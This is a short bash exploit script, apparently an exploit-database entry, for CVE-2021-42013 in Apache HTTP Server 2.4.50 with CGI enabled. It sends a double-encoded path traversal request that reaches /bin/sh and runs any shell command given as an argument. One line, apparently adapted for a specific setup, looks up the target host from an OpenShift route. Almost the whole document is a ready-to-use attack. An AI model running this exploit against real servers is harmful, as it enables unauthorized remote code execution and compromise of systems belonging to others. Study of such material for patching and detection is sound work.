# Exploit: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)
# Credits: Ash Daulton & cPanel Security Team
# Date: 24/07/2021
# Exploit Author: TheLastVvV.com
# Vendor Homepage:  https://apache.org/
# Version: Apache 2.4.50 with CGI enable
# Tested on : Debian 5.10.28
# CVE : CVE-2021-42013

#!/bin/bash

echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'

export target=$(oc -n frontend get route/asset-cache --output jsonpath={.spec.host} 2>/dev/null)

function exploit(){
echo "WebServer Version: " $(curl -I -L -s $1 | grep -i server)
curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $2"
}

if [ ! -z "$1" ] && [ ! -z "$2" ]
then
  exploit $1 $2
  exit 0
fi

if [ ! -z "$target" ] && [ ! -z "$1" ]
then
  exploit $target $1
  exit 0
fi

if [ ! -z "$target" ] && [ -z "$1" ]
then
  echo  "try: $0 <shell command>"
  exit 1
fi

if [ -z "$target" ] && [ -z "$2" ]
then
  echo  "try: $0 <target_url> <shell command>"
  exit 1
fi
